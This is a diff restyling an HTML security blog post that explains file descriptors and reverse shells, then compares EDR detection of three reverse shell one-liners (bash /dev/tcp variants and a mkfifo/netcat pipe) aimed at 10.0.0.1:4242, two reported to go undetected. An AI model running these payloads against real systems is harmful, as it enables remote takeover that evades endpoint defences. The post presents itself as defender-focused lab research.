@@ -4,78 +4,46 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>EDR Evasion: How Reverse Shell Syntax Bypasses Detection</title>
-
-  <!-- Responsive patch (minimal + specific) -->
   <style>
-    /* Prevent any accidental overflow */
     html, body { max-width: 100%; overflow-x: hidden; }
-
-    /* Make images/svgs shrink nicely */
     img, svg { max-width: 100%; height: auto; }
-
-    /* Ensure long tables can scroll on mobile */
     #resultTable { display: block; width: 100%; overflow-x: auto; }
-
-    /* Desktop: keep existing absolute link */
     #backLink { position: absolute; top: 50%; right: 2rem; transform: translateY(-50%); }
-
-    /* Minor helpers for cards that need to stack on mobile */
     .step-card { min-width: 0 !important; }
     #cmpWrap > div { min-width: 0 !important; }
-
-    /* fd cards helper */
     .fd-card { margin: 0 .5rem; }
-
-    /* Mobile tweaks */
     @media (max-width: 768px) {
-      /* Header spacing + readable titles */
       header { padding: 1.25rem !important; }
       #title { font-size: clamp(1.6rem, 6vw, 2rem) !important; }
       #subtitle { font-size: 1rem !important; }
-
-      /* Put "Back to Blogs" above title to avoid overlap */
       #backLink {
         position: static !important;
         transform: none !important;
         text-align: left;
         margin-bottom: .5rem;
       }
-
-      /* Meta row stacks neatly */
       #metaRow {
         flex-direction: column !important;
         align-items: center !important;
         gap: .35rem !important;
         text-align: center;
       }
-
-      /* File descriptors row becomes a column */
       #fdRow { flex-direction: column !important; gap: 12px !important; }
       .fd-card { margin: 0 !important; }
-
-      /* Numbered steps: one per row */
       .step-card { flex: 1 1 100% !important; }
-
-      /* Comparison cards: one per row */
       #cmpWrap > div { flex: 1 1 100% !important; }
-
-      /* Long code lines can scroll (keep original look) */
       pre { overflow-x: auto !important; white-space: pre; }
-
-      /* Reduce large paddings a bit inside main card */
       .main-article { padding: 1.25rem !important; }
       .h-scroll {
     overflow-x: auto;
-    -webkit-overflow-scrolling: touch; /* iOS momentum */
-    touch-action: pan-x;               /* ensures horizontal panning */
+    -webkit-overflow-scrolling: touch; 
+    touch-action: pan-x;
     margin: 1rem 0;
-    border-radius: 8px;                /* moved from table */
+    border-radius: 8px;
   }
-  /* Make the table wider than the viewport so scrolling is possible */
   .h-scroll > #resultTable {
-    min-width: 720px;                  /* adjust if you need more/less */
+    min-width: 720px;
   }
-  /* Prevent cell content from wrapping on narrow screens */
   @media (max-width: 768px) {
     .h-scroll th,
     .h-scroll td { white-space: nowrap; }
@@ -83,11 +51,11 @@
     }
   </style>
 </head>
-<body style="box-sizing:border-box; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height:1.6; color:#333; background-color:#f5f7f9;">
+<body style="box-sizing:border-box; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height:1.6; color:#e5e7eb; background-color:#0b1220;">
   <div id="top" aria-hidden="true"></div>
-  <header style="position:relative; background:linear-gradient(135deg,#2c3e50 0%,#4a6491 100%); color:#fff; padding:2rem; border-bottom:5px solid #ff5722;">
+  <header style="position:relative; background:linear-gradient(135deg,#0b1220 0%,#1f2a44 100%); color:#fff; padding:2rem; border-bottom:5px solid #ff6a3d;">
     <div id="backLink">
-      <a href="../projects.html" style="color:#ffb347; font-size:14px; text-decoration:none; font-weight:500;">
+      <a href="../projects.html" style="color:#ffcc80; font-size:14px; text-decoration:none; font-weight:500;">
         ← Back to Projects
       </a>
     </div>
@@ -98,10 +66,10 @@
       <p id="subtitle" style="font-size:1.3rem; font-weight:300; max-width:800px; margin:0 auto;">
         Exploring why some reverse shell commands are flagged <br> while others slip through undetected
       </p>
-      <div id="metaRow" style="display:flex; justify-content:center; gap:20px; margin-top:1.5rem; font-size:.9rem; color:rgba(255,255,255,.8);">
+      <div id="metaRow" style="display:flex; justify-content:center; gap:20px; margin-top:1.5rem; font-size:.9rem; color:rgba(255,255,255,.78);">
         <span>Written by: Iron Hulk</span>
         <span>Published: September 1, 2025</span>
-        <span id="reading-time" style="color:rgba(255,255,255,.8);"></span>
+        <span id="reading-time" style="color:rgba(255,255,255,.78);"></span>
         <span>
           <a href="https://twitter.com/IronHulk_0xff" target="_blank" rel="noopener noreferrer"
             style="color:#ffffff; text-decoration:none; display:inline-flex; align-items:center; gap:5px;">
@@ -117,99 +85,100 @@
 
   <main id="content" role="main">
     <div style="margin:0 auto; padding:20px;">
-      <div class="main-article" style="background:#fff; padding:2rem; border-radius:8px; box-shadow:0 4px 10px rgba(0,0,0,.1);">
-        <div style="font-size:1.1rem; background:#e8f4fc; padding:1.5rem; border-left:4px solid #3498db; border-radius:4px; margin:0 0 2rem;">
+      <div class="main-article" style="background:#0f172a; padding:2rem; border-radius:8px; box-shadow:0 8px 24px rgba(0,0,0,.55); border:1px solid rgba(148,163,184,.18);">
+        <div style="font-size:1.1rem; background:#0b2540; padding:1.5rem; border-left:4px solid #60a5fa; border-radius:4px; margin:0 0 2rem;">
           <p style="margin:0;">"Have you ever wondered why a slightly different reverse shell command might bypass security controls?"</p>
         </div>
         <p style="margin:0 0 1.2rem;">
-          On my previous <a href="https://x.com/ironhulk_0xff/status/1962209989893976264?s=46" style="color:#ff5722; text-decoration:none; font-weight:500;"> <strong>post on X</strong></a>, while I was testing malware against Endpoint Detection and Response systems, I found something interesting. A standard reverse shell payload 
-          from <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/" style="color:#ff5722; text-decoration:none; font-weight:500;"><strong>PayloadAllTheThings</strong></a> was quickly detected, but two other payloads from the same source that do the same thing went unnoticed. This post explains what I found, looking
+          On my previous <a href="https://x.com/ironhulk_0xff/status/1962209989893976264?s=46" style="color:#ff6a3d; text-decoration:none; font-weight:500;"> <strong>post on X</strong></a>, while I was testing malware against Endpoint Detection and Response systems, I found something interesting. A standard reverse shell payload 
+          from <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/" style="color:#ff6a3d; text-decoration:none; font-weight:500;"><strong>PayloadAllTheThings</strong></a> was quickly detected, but two other payloads from the same source that do the same thing went unnoticed. This post explains what I found, looking
           into how file descriptor redirection works and the key difference between signature-based detection and behavior-based detection in today's security tools.
         </p>
-        <h2 style="color:#2c3e50; margin:2rem 0 1rem; padding-bottom:.5rem; border-bottom:2px solid #eee;">Understanding what is stdout &amp; stderr:</h2>
+        <h2 style="color:#e5e7eb; margin:2rem 0 1rem; padding-bottom:.5rem; border-bottom:2px solid rgba(148,163,184,.2);">Understanding what is stdout &amp; stderr:</h2>
         <p style="margin:0 0 1.2rem;">In Unix/Linux systems, every process has three standard <strong>File Descriptors (FDs)</strong> by default:</p>
-        <div style="background:#f8f8f8; padding:1.5rem; border-radius:8px; margin:1.5rem 0;">
-          <h3 style="text-align:center; color:#ff5722; margin:0 0 1rem;">Linux File Descriptors</h3>
+        <div style="background:#0b1220; padding:1.5rem; border-radius:8px; margin:1.5rem 0; border:1px solid rgba(148,163,184,.18);">
+          <h3 style="text-align:center; color:#ff6a3d; margin:0 0 1rem;">Linux File Descriptors</h3>
           <div id="fdRow" style="display:flex; justify-content:space-between; margin:0 0 1.5rem;">
-            <div class="fd-card" style="text-align:center; flex:1; padding:1rem; background:#fff; border-radius:6px; box-shadow:0 2px 5px rgba(0,0,0,.1); margin:0 .5rem;">
-              <div style="font-size:1.8rem; font-weight:700; color:#2c3e50;">0</div>
+            <div class="fd-card" style="text-align:center; flex:1; padding:1rem; background:#0f172a; border-radius:6px; box-shadow:0 6px 16px rgba(0,0,0,.45); margin:0 .5rem; border:1px solid rgba(148,163,184,.16);">
+              <div style="font-size:1.8rem; font-weight:700; color:#e5e7eb;">0</div>
               <div style="font-weight:700; margin:.5rem 0;">STDIN (FD 0)</div>
-              <div>Standard Input</div>
+              <div style="color:#cbd5e1;">Standard Input</div>
             </div>
-            <div class="fd-card" style="text-align:center; flex:1; padding:1rem; background:#fff; border-radius:6px; box-shadow:0 2px 5px rgba(0,0,0,.1); margin:0 .5rem;">
-              <div style="font-size:1.8rem; font-weight:700; color:#2c3e50;">1</div>
+            <div class="fd-card" style="text-align:center; flex:1; padding:1rem; background:#0f172a; border-radius:6px; box-shadow:0 6px 16px rgba(0,0,0,.45); margin:0 .5rem; border:1px solid rgba(148,163,184,.16);">
+              <div style="font-size:1.8rem; font-weight:700; color:#e5e7eb;">1</div>
               <div style="font-weight:700; margin:.5rem 0;">STDOUT (FD 1)</div>
-              <div>Standard Output</div>
+              <div style="color:#cbd5e1;">Standard Output</div>
             </div>
-            <div class="fd-card" style="text-align:center; flex:1; padding:1rem; background:#fff; border-radius:6px; box-shadow:0 2px 5px rgba(0,0,0,.1); margin:0 .5rem;">
-              <div style="font-size:1.8rem; font-weight:700; color:#2c3e50;">2</div>
+            <div class="fd-card" style="text-align:center; flex:1; padding:1rem; background:#0f172a; border-radius:6px; box-shadow:0 6px 16px rgba(0,0,0,.45); margin:0 .5rem; border:1px solid rgba(148,163,184,.16);">
+              <div style="font-size:1.8rem; font-weight:700; color:#e5e7eb;">2</div>
               <div style="font-weight:700; margin:.5rem 0;">STDERR (FD 2)</div>
-              <div>Standard Error</div>
+              <div style="color:#cbd5e1;">Standard Error</div>
             </div>
           </div>
-          <div style="margin:0 0 ; font-size:1rem; line-height:1.6; background:#f9fafb; border-left:4px solid #3498db; padding:1.2rem 1.5rem; border-radius:6px;">
+          <div style="margin:0 0 ; font-size:1rem; line-height:1.6; background:#0f172a; border-left:4px solid #60a5fa; padding:1.2rem 1.5rem; border-radius:6px; border:1px solid rgba(148,163,184,.14);">
             <p style="margin:0 0 0.8rem;">
               Every process in Unix/Linux starts with three default channels known as
-              <code>stdin</code>, <code>stdout</code>, and <code>stderr</code>.
+              <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">stdin</code>, <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">stdout</code>, and <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">stderr</code>.
             </p>
             <div style="margin-bottom:1rem;">
-              <strong style="color:#2c3e50;">Standard Input (stdin):</strong>
+              <strong style="color:#e5e7eb;">Standard Input (stdin):</strong>
               <ul style="margin:0.5rem 0 0 1.2rem; padding:0;">
                 <li><strong>File descriptor number:</strong> 0</li>
                 <li><strong>What it is:</strong> where the program reads data from. By default, this is your keyboard, but it can be redirected from a file or another process</li>
-                <li><strong>Example:</strong> <code>cat &lt; file.txt</code></li>
+                <li><strong>Example:</strong> <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">cat &lt; file.txt</code></li>
               </ul>
             </div>
             <div style="margin-bottom:1rem;">
-              <strong style="color:#2c3e50;">Standard Output (stdout):</strong>
+              <strong style="color:#e5e7eb;">Standard Output (stdout):</strong>
               <ul style="margin:0.5rem 0 0 1.2rem; padding:0;">
                 <li><strong>File descriptor number:</strong> 1</li>
                 <li><strong>What it is:</strong> where the program writes its normal results. By default, this shows up in your terminal, but you can redirect it into a file or pipe it into another program</li>
-                <li><strong>Example:</strong> <code>echo &quot;Hello&quot; &gt; out.txt</code></li>
+                <li><strong>Example:</strong> <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">echo &quot;Hello&quot; &gt; out.txt</code></li>
               </ul>
             </div>
             <div>
-              <strong style="color:#2c3e50;">Standard Error (stderr):</strong>
+              <strong style="color:#e5e7eb;">Standard Error (stderr):</strong>
               <ul style="margin:0.5rem 0 0 1.2rem; padding:0;">
                 <li><strong>File descriptor number:</strong> 2</li>
                 <li><strong>What it is:</strong> where the program sends error messages. It also shows in your terminal by default, but it remains separate from stdout so you can capture errors without mixing them into normal output</li>
-                <li><strong>Example:</strong> <code>ls no_such_file 2&gt; errors.log</code></li>
+                <li><strong>Example:</strong> <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">ls no_such_file 2&gt; errors.log</code></li>
               </ul>
               <p style="margin:1rem 0 0;">
-                <em>Why separate channels?</em> This design lets you redirect or pipe each one independently.
-                For example: <code>ls &gt;out.txt 2&gt;errors.txt</code> saves successful output into one file
-                while errors are logged in another. In reverse shells, attackers often remap <code>0</code>,
-                <code>1</code>, and <code>2</code> all to a network socket to create a fully interactive channel.
+                <em style="color:#cbd5e1;">Why separate channels?</em> This design lets you redirect or pipe each one independently.
+                For example: <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">ls &gt;out.txt 2&gt;errors.txt</code> saves successful output into one file
+                while errors are logged in another. In reverse shells, attackers often remap <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">0</code>,
+                <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">1</code>, and
+                <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">2</code> all to a network socket to create a fully interactive channel.
               </p>
             </div>
           </div>
         </div>
-        <div style="margin:0 0 1.5rem; font-size:1rem; line-height:1.6; background:#f9fafb; border-left:4px solid #ff5722; padding:1.2rem 1.5rem; border-radius:6px;">
-          <div style="margin:0 0 1.2rem; font-size:1.05rem; line-height:1.6; background:#fff8f6; border-left:4px solid #ff5722; padding:1rem 1.2rem; border-radius:6px;">
+        <div style="margin:0 0 1.5rem; font-size:1rem; line-height:1.6; background:#0f172a; border-left:4px solid #ff6a3d; padding:1.2rem 1.5rem; border-radius:6px; border:1px solid rgba(148,163,184,.14);">
+          <div style="margin:0 0 1.2rem; font-size:1.05rem; line-height:1.6; background:#1a0f10; border-left:4px solid #ff6a3d; padding:1rem 1.2rem; border-radius:6px; border:1px solid rgba(255,106,61,.18);">
             <p style="margin:0;">
               A <strong>reverse shell</strong> is a simple but powerful method attackers use to take control of a system from a distance. Instead of the attacker trying to connect directly to the victim's computer, the victim's computer connects back to the attacker's machine, setting up a way to send and receive commands.
             </p>
           </div>
-          <strong style="color:#c0392b; display:block; margin-bottom:.4rem;">Reverse Shell</strong>
+          <strong style="color:#ff6a3d; display:block; margin-bottom:.4rem;">Reverse Shell</strong>
           <ul style="margin:.5rem 0 0 1.2rem; padding:0;">
             <li><strong>What it is:</strong> A shell session where the target machine connects back to the attacker’s system.</li>
-            <li><strong>What it does:</strong> Redirects the target’s <code>stdin</code>, <code>stdout</code>, and <code>stderr</code> through a network socket for interactive command execution.</li>
+            <li><strong>What it does:</strong> Redirects the target’s <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">stdin</code>, <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">stdout</code>, and <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">stderr</code> through a network socket for interactive command execution.</li>
             <li><strong>How it works:</strong> The compromised host opens an outbound connection to the attacker’s listener (often bypassing NAT/firewalls that allow outbound traffic).</li>
             <li><strong>Example flow:</strong>
               <div style="display:flex; flex-wrap:wrap; gap:12px; margin:1rem 0 0;">
-                <div class="step-card" style="flex:1 1 200px; min-width:200px; text-align:center; padding:1rem; background:#ffffff; border:1px solid #eee; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,.05);">
+                <div class="step-card" style="flex:1 1 200px; min-width:200px; text-align:center; padding:1rem; background:#0f172a; border:1px solid rgba(148,163,184,.18); border-radius:8px; box-shadow:0 6px 16px rgba(0,0,0,.35);">
                   <div style="width:40px; height:40px; margin:0 auto 10px; background:#58a6ff; color:#fff; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:700;">1</div>
                   <p style="margin:0;">Attacker listens: nc -nlvp 10.0.0.1:4242</p>
                 </div>
-                <div class="step-card" style="flex:1 1 200px; min-width:200px; text-align:center; padding:1rem; background:#ffffff; border:1px solid #eee; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,.05);">
+                <div class="step-card" style="flex:1 1 200px; min-width:200px; text-align:center; padding:1rem; background:#0f172a; border:1px solid rgba(148,163,184,.18); border-radius:8px; box-shadow:0 6px 16px rgba(0,0,0,.35);">
                   <div style="width:40px; height:40px; margin:0 auto 10px; background:#58a6ff; color:#fff; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:700;">2</div>
                   <p style="margin:0;">Victim runs a payload that connects back to the attacker</p>
                 </div>
-                <div class="step-card" style="flex:1 1 200px; min-width:200px; text-align:center; padding:1rem; background:#ffffff; border:1px solid #eee; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,.05);">
+                <div class="step-card" style="flex:1 1 200px; min-width:200px; text-align:center; padding:1rem; background:#0f172a; border:1px solid rgba(148,163,184,.18); border-radius:8px; box-shadow:0 6px 16px rgba(0,0,0,.35);">
                   <div style="width:40px; height:40px; margin:0 auto 10px; background:#58a6ff; color:#fff; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:700;">3</div>
                   <p style="margin:0;">The victim’s shell dials out to the attacker</p>
                 </div>
-                <div class="step-card" style="flex:1 1 200px; min-width:200px; text-align:center; padding:1rem; background:#ffffff; border:1px solid #eee; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,.05);">
+                <div class="step-card" style="flex:1 1 200px; min-width:200px; text-align:center; padding:1rem; background:#0f172a; border:1px solid rgba(148,163,184,.18); border-radius:8px; box-shadow:0 6px 16px rgba(0,0,0,.35);">
                   <div style="width:40px; height:40px; margin:0 auto 10px; background:#58a6ff; color:#fff; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:700;">4</div>
                   <p style="margin:0;">Attacker gains an interactive shell over TCP</p>
                 </div>
@@ -217,12 +186,12 @@
             </li>
           </ul>
           <div style="margin:2rem 0 1rem; display:flex; align-items:flex-end; justify-content:space-between; gap:12px;">
-            <h2 id="cmpHeading" style="margin:0; font-size:1.3rem; color:#1b2a41;">Reverse Shell vs Bind Shell</h2>
-            <div style="height:1px; flex:1; background:#e6ecf5;"></div>
+            <h2 id="cmpHeading" style="margin:0; font-size:1.3rem; color:#e5e7eb;">Reverse Shell vs Bind Shell</h2>
+            <div style="height:1px; flex:1; background:rgba(148,163,184,.22);"></div>
           </div>
           <div id="cmpWrap" style="display:flex; flex-wrap:wrap; gap:18px;">
-            <div id="revCard" style="flex:1 1 320px; background:#ffffff; color:#0f2233; padding:1.2rem 1.4rem; border-radius:12px; border:1px solid #e6ecf5; box-shadow:0 4px 10px rgba(0,0,0,.06);">
-              <h3 id="revTitle" style="margin:0 0 .8rem; color:#ff5722;">Reverse Shell</h3>
+            <div id="revCard" style="flex:1 1 320px; background:#0f172a; color:#e5e7eb; padding:1.2rem 1.4rem; border-radius:12px; border:1px solid rgba(148,163,184,.18); box-shadow:0 10px 24px rgba(0,0,0,.35);">
+              <h3 id="revTitle" style="margin:0 0 .8rem; color:#ff6a3d;">Reverse Shell</h3>
               <ul style="margin:0; padding-left:1.2rem;">
                 <li>Target initiates the connection</li>
                 <li>Easier to bypass firewalls</li>
@@ -230,8 +199,8 @@
                 <li>More common in modern attacks</li>
               </ul>
             </div> 
-            <div id="bindCard" style="flex:1 1 320px; background:#ffffff; color:#0f2233; padding:1.2rem 1.4rem; border-radius:12px; border:1px solid #e6ecf5; box-shadow:0 4px 10px rgba(0,0,0,.06);">
-              <h3 id="bindTitle" style="margin:0 0 .8rem; color:#f59e0b;">Bind Shell</h3>
+            <div id="bindCard" style="flex:1 1 320px; background:#0f172a; color:#e5e7eb; padding:1.2rem 1.4rem; border-radius:12px; border:1px solid rgba(148,163,184,.18); box-shadow:0 10px 24px rgba(0,0,0,.35);">
+              <h3 id="bindTitle" style="margin:0 0 .8rem; color:#fbbf24;">Bind Shell</h3>
               <ul style="margin:0; padding-left:1.2rem;">
                 <li>Attacker initiates the connection</li>
                 <li>Often blocked by firewalls</li>
@@ -244,56 +213,56 @@
         <p style="margin:1rem 0 0;">
           With the fundamentals of <strong>stdout, stderr, redirection, and reverse shells</strong> in place, we can finally turn to the experiment. Let’s break down why one command triggered detection while the others managed to slip through.
         </p>
-        <h2 style="color:#2c3e50; margin:2rem 0 1rem; padding-bottom:.5rem; border-bottom:2px solid #eee;">The Experiment: Testing EDR</h2>
-        <div style="background:#ffebee; padding:1.2rem; border-left:4px solid #f44336; border-radius:4px; margin:1.5rem 0; font-size:.9rem;">
+        <h2 style="color:#e5e7eb; margin:2rem 0 1rem; padding-bottom:.5rem; border-bottom:2px solid rgba(148,163,184,.2);">The Experiment: Testing EDR</h2>
+        <div style="background:#2a0f14; padding:1.2rem; border-left:4px solid #ef4444; border-radius:4px; margin:1.5rem 0; font-size:.9rem; border:1px solid rgba(239,68,68,.18);">
           <strong>Disclaimer:</strong> I have conducted this research in a controlled lab environment for educational purposes. All techniques are shared to help defenders improve their security posture. Always ensure you have explicit permission before testing on any system.
         </div>
-        <h2 style="margin:2rem 0 1rem; color:#2c3e50;">Understanding Each Command</h2>
-        <div style="margin:1.2rem 0; padding:1rem 1.2rem; background:#fff8f6; border-left:4px solid #f44336; border-radius:6px;">
+        <h2 style="margin:2rem 0 1rem; color:#e5e7eb;">Understanding Each Command</h2>
+        <div style="margin:1.2rem 0; padding:1rem 1.2rem; background:#1a0f10; border-left:4px solid #ef4444; border-radius:6px; border:1px solid rgba(239,68,68,.18);">
           <p style="margin:0 0 .6rem;"><strong>Flagged Payload:</strong></p>
-          <pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">bash -i >& /dev/tcp/10.0.0.1/4242 0>&1</pre>
+          <pre style="margin:0; padding:.8rem; background:#0b1220; color:#e5e7eb; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace; border:1px solid rgba(148,163,184,.16);">bash -i >& /dev/tcp/10.0.0.1/4242 0>&1</pre>
           <ul style="margin:.6rem 0 0 1.2rem;">
-            <li><code>bash -i</code> → launches an interactive bash shell.</li>
-            <li><code>&gt;&amp; /dev/tcp/10.0.0.1/4242</code> → redirects both <code>stdout</code> and <code>stderr</code> to a TCP socket at <code>10.0.0.1:4242</code>.</li>
-            <li><code>0&gt;&amp;1</code> → ties <code>stdin</code> into the same socket, making the shell interactive.</li>
+            <li><code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">bash -i</code> → launches an interactive bash shell.</li>
+            <li><code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">&gt;&amp; /dev/tcp/10.0.0.1/4242</code> → redirects both <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">stdout</code> and <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">stderr</code> to a TCP socket at <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">10.0.0.1:4242</code>.</li>
+            <li><code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">0&gt;&amp;1</code> → ties <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">stdin</code> into the same socket, making the shell interactive.</li>
           </ul>
           <p style="margin:.8rem 0 0;">
-            <strong>Behavior:</strong> Immediately creates a full interactive session over TCP using Bash’s built-in <code>/dev/tcp</code>.<br>
-            <strong>Why flagged:</strong> The <code>&gt;&amp;</code> + <code>/dev/tcp</code> pattern is a well-known reverse shell signature used in countless cheat sheets.
+            <strong>Behavior:</strong> Immediately creates a full interactive session over TCP using Bash’s built-in <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">/dev/tcp</code>.<br>
+            <strong>Why flagged:</strong> The <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">&gt;&amp;</code> + <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">/dev/tcp</code> pattern is a well-known reverse shell signature used in countless cheat sheets.
           </p>
         </div>
-        <div style="margin:1.2rem 0; padding:1rem 1.2rem; background:#f9f9f9; border-left:4px solid #4caf50; border-radius:6px;">
+        <div style="margin:1.2rem 0; padding:1rem 1.2rem; background:#0b1220; border-left:4px solid #22c55e; border-radius:6px; border:1px solid rgba(34,197,94,.18);">
           <p style="margin:0 0 .6rem;"><strong>Unflagged Payload:</strong></p>
-          <pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1</pre>
+          <pre style="margin:0; padding:.8rem; background:#0b1220; color:#e5e7eb; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace; border:1px solid rgba(148,163,184,.16);">/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1</pre>
           <ul style="margin:.6rem 0 0 1.2rem;">
-            <li><code>/bin/bash -l</code> → launches bash as a login shell (slightly different process profile).</li>
-            <li><code>&gt; /dev/tcp/10.0.0.1/4242</code> → sends <code>stdout</code> to the TCP socket only.</li>
-            <li><code>0&lt;&amp;1</code> → maps <code>stdin</code> from the socket connection.</li>
-            <li><code>2&gt;&amp;1</code> → merges <code>stderr</code> into <code>stdout</code> (also going to the socket).</li>
+            <li><code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">/bin/bash -l</code> → launches bash as a login shell (slightly different process profile).</li>
+            <li><code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">&gt; /dev/tcp/10.0.0.1/4242</code> → sends <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">stdout</code> to the TCP socket only.</li>
+            <li><code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">0&lt;&amp;1</code> → maps <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">stdin</code> from the socket connection.</li>
+            <li><code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">2&gt;&amp;1</code> → merges <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">stderr</code> into <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">stdout</code> (also going to the socket).</li>
           </ul>
           <p style="margin:.8rem 0 0;">
             <strong>Behavior:</strong> Builds the same fully interactive shell, but assembles the redirections step by step.<br>
             <strong>Why missed:</strong> The syntax order is less common and doesn’t match the “classic” signature pattern.
           </p>
         </div>
-        <div style="margin:1.2rem 0; padding:1rem 1.2rem; background:#f9f9f9; border-left:4px solid #4caf50; border-radius:6px;">
+        <div style="margin:1.2rem 0; padding:1rem 1.2rem; background:#0b1220; border-left:4px solid #22c55e; border-radius:6px; border:1px solid rgba(34,197,94,.18);">
           <p style="margin:0 0 .6rem;"><strong>Unflagged Payload (FIFO + Netcat):</strong></p>
-          <pre style="margin:0; padding:.8rem; background:#2c3e50; color:#f8f8f8; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace;">rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4242 >/tmp/f</pre>
+          <pre style="margin:0; padding:.8rem; background:#0b1220; color:#e5e7eb; border-radius:4px; overflow-x:auto; font-family:'Courier New', monospace; border:1px solid rgba(148,163,184,.16);">rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4242 >/tmp/f</pre>
           <ul style="margin:.6rem 0 0 1.2rem;">
-            <li><code>rm -f /tmp/f</code> → deletes any previous FIFO named <code>/tmp/f</code>.</li>
-            <li><code>mkfifo /tmp/f</code> → creates a named pipe to act as a data channel.</li>
-            <li><code>cat /tmp/f | /bin/sh -i</code> → takes input from the FIFO and feeds it into an interactive shell.</li>
-            <li><code>2&gt;&amp;1</code> → merges <code>stderr</code> into <code>stdout</code>.</li>
-            <li><code>| nc 10.0.0.1 4242</code> → uses netcat to send output to the attacker over TCP.</li>
-            <li><code>&gt;/tmp/f</code> → routes input from netcat back into the FIFO, closing the loop.</li>
+            <li><code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">rm -f /tmp/f</code> → deletes any previous FIFO named <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">/tmp/f</code>.</li>
+            <li><code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">mkfifo /tmp/f</code> → creates a named pipe to act as a data channel.</li>
+            <li><code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">cat /tmp/f | /bin/sh -i</code> → takes input from the FIFO and feeds it into an interactive shell.</li>
+            <li><code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">2&gt;&amp;1</code> → merges <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">stderr</code> into <code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">stdout</code>.</li>
+            <li><code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">| nc 10.0.0.1 4242</code> → uses netcat to send output to the attacker over TCP.</li>
+            <li><code style="background:rgba(148,163,184,.14); color:#e5e7eb; padding:2px 6px; border-radius:6px;">&gt;/tmp/f</code> → routes input from netcat back into the FIFO, closing the loop.</li>
           </ul>
           <p style="margin:.8rem 0 0;">
